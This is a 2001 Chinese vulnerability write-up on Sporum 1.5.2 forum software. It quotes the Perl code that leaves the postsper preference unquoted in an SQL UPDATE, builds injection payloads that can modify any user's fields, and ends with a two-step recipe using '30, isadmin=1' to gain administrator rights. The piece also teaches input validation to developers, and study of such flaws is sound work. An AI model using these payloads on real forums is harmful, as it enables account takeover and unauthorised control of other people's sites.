---
title: "如何成为Sporum论坛的管理员"
date: 2001-07-08T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-217"
---

(inburst_at_263.net)

如何成为Sporum论坛的管理员 

      by stardust <stardust@xfocus.org>


      前几天在网上瞎逛,撞进了一个介绍Linux的站点,站点本身制作平平,但它有一个看起来还不错的论坛.页面的底部提供了一个叫"Powered by Sporum1.5.2"的链接,指向论坛程序的官方主页.从那里我知道了Sporum是用Perl写的,以MySQL为后台数据库,注册用户可以在论坛发贴子,允许用户订制自己的偏好,并以cookies进行身份验证.这个使我不由得想到了wwwthreads这个著名的论坛程序,从架构和功能上Sporum都和它很相似.而在此不久之前,wwwthreads已被发现有安全漏洞,可以使任何普通用户成为论坛的管理员.这使著名的安全资源站点packetstorm遭了殃,导致它使用了wwwthreads的论坛被人劫持.想了解更多的细节,你可以读一下:


      [http://packetstorm.securify.com/0002-exploits/rfp2k01.txt](http://packetstorm.securify.com/0002-exploits/rfp2k01.txt)


      在这里rfp描述了他如何hack了论坛以及对基于WEB的数据库系统的分析,很有启发性,值得一读.rfp在他的文章里指出wwwthreads的安全漏洞在于没有对从表单来的用户输入进行全面的检查.既然Sporum那么象wwwthreads,会不会也存在相似的问题呢?


      好,那么让我们来看看吧,从linuxberg很容易地可以得到Sporum的1.5.2版.和wwwthreads一样,Sporum允许用户订制自己的偏好你可以订制贴子如何显示,如何排列.wwwthreads正是死在这,那么Sporum呢?在User.pm的可以找到相关的程序片断:


      sub save_preferences1{

      my ($self, $STATE) = @_;

      my ($STATE, $spdb) = map{ $self->{$_} } qw(STATE spdb);

      my $DBH = $spdb->{'dbh'};


      my ($postsper, $myuid, $uid, $prev_op) =

      map{ $STATE->{$_} } qw(mypostsper myuid uid prev_op);


      # --- check the uid --- thanks Tim W from solutionscripts.com

      # --- if uid ne myuid

      if($uid != $myuid){

      # --- need admin right to change the profile

      my ($isadmin) = $spdb->db_select_cols("isadmin", "Users", "uid=$uid");

      if(!$isadmin){

      return (0, $lang->{'not_allow_edit'}, "", "$config->{'cgidir'}/user.cgi");

      }

      }


      my ($sigq, $sortq, $displayq, $viewq, $cookieexpireq) =

      map{ $DBH->quote($STATE->{$_}) } <------ 在用户输入的数据外面套上' '

      qw(mysig mysort mydisplay myview cookieexpire);

      my $data = {('sig'=>$sigq,

      'sort'=>$sortq, 'display'=>$displayq,

      'view'=>$viewq, 'postsper'=>$postsper, <------看这,是不是有点特别

      'cookieexpire'=>$cookieexpireq)};

      my ($succ, $errmsg) = $spdb->db_update("Users", $data, "uid=$myuid");


      my $uri = "$config->{'cgidir'}/user.cgi";

      if($prev_op eq "modifyuser"){

      $uri = "$config->{'cgidir'}/admin.cgi";

      }


      return (0, $errmsg) if !$succ;

      return (1, $lang->{'profile_modified2'}, $lang->{'profile_modified1'}, $uri);

      }


      哈哈,果然不出所料,看出问题出在那了吗?程序会根据你的输入更新数据库,更新的字段有sig,sort,view,display,cookieexpire和postsper,其中前五个字段在数据库中是字符型的,虽然程序没对其做什么检查,但它会在它们外面套上' ',这样用户的输入将不会影响到后来的数据库更新操作.可是postper字段不同,它是数值型的,程序忘记给它穿外套了,看起来我们机会来了.


      $spdb->db_update("Users", $data, "uid=$myuid");


      这个语句的功能是其实就是,根据提供给它的参数生成一个MySQL的Update命令然后交给MySQL去执行.假如我们提交给表单的数据是这样的:


      sort="date desc",theme=NULL,view="collapsed",sig="",display="threaded", cookieexpire="+1d",uid=1246,postsper=30


      那么转换出来的Update语句会是这样的:

      UPDATE Users SET postsper=30, sort='date desc', theme=NULL, view='collapsed', sig='', display='threaded', cookieexpire='+1d' WHERE uid=1246


      我们看到postsper=30没有套上' '外套.这是正常的情况,没什么害处.但是如果postsper的值是这样的呢:"30, somecols=newvalue",那么转换出来的Update语句就变成了:


      UPDATE Users SET postsper=30, somecols=newvalue, sort='date desc', theme=NULL,

      ~~~~~~~~~~~~~~~~~~~~~\

      我们的输入

      view='collapsed', sig='', display='threaded', cookieexpire='+1d' WHERE uid=1246


      这将允许我们修改uid=1246这个用户的任意字段!其实利用postsper，我们可以修改任意用户的任意字段.假设一下postsper="30,somecol=newvalue where uid=other's_id #"，那么相应的Update语句就是这样的:


      UPDATE Users SET postsper=30,somecol=newvalue where uid=other's_id #, sort='date desc',

      theme=NULL, view='collapsed', sig='', display='threaded', cookieexpire='+1d'

      WHERE uid=1246


      因为MySQL将#后的内容作为注释忽略掉,实际执行的是#以前的部分.这样我们其实可以修改Users表中的任意字段.好了,说了这么多,到底修改哪个字段,能使我们成为管理员呢?看一下Users表的结构就知道了:


      CREATE TABLE Users(

      uid INT(11) NOT NULL, # --- user id

      username CHAR(30) NOT NULL, # --- username

      passwd CHAR(50) NOT NULL, # --- password

      nickname CHAR(50) NOT NULL, # --- nickname

      realname CHAR(50), # --- real name

      realemail CHAR(50), # --- real email

      fakeemail CHAR(50), # --- fake email

      homepage CHAR(100), # --- homepage

      bio TEXT, # --- bio

      sig TEXT, # --- sig

      icq VARCHAR(50), # --- icq

      sort VARCHAR(20)

      DEFAULT "date desc", # --- sort

      display CHAR(11)

      DEFAULT "threaded", # --- display mode

      view CHAR(10)

      DEFAULT "collapsed", # --- view mode

      postsper INT(11) DEFAULT 10, # --- posts per page

      lastlogon DATETIME NOT NULL, # --- last logon

      active INT(1) NOT NULL # --- status - 0, 1, 2

      DEFAULT 0,

      peek INT(11) UNSIGNED NOT NULL,# --- hits on the user profile

      registered DATETIME NOT NULL, # --- registered on

      cookieexpire CHAR(5) NOT NULL # --- login cookie expire

      DEFAULT '+1d',

      isadmin INT(1) NOT NULL # --- is user a admin? <------在这儿呢

      DEFAULT 0,


      # --- 8/27/99

      location VARCHAR(150), # --- user location

      photourl VARCHAR(150), # --- location of photo

      privlev INT(1) NOT NULL, # --- privacy level


      # --- 8/30/99

      theme VARCHAR(100) NOT NULL # --- theme

      DEFAULT "default",


      # --- 9/12/99

      lastresp DATETIME NOT NULL, # --- last response


      PRIMARY KEY (uid, username),

      INDEX index1 (uid),

      INDEX index2 (username)

      );


      把postsper的值设成"30, isadmin=1",程序就会把我们更新成管理员了,是不是很不错?


      简单总结一下如何成为Sporum论坛的管理员:


      1. 注册一个普通用户

      2. 登录后进入修改个人偏好表单,在postsper输入框中填入"30, isadmin=1",按"save".


      你就成为管理员了.


      结论:开发cgi程序一定要全面地检查用户的输入,不要想当然的认为用户会输入合法的数据给你,不这样做,是拿安全在冒险.
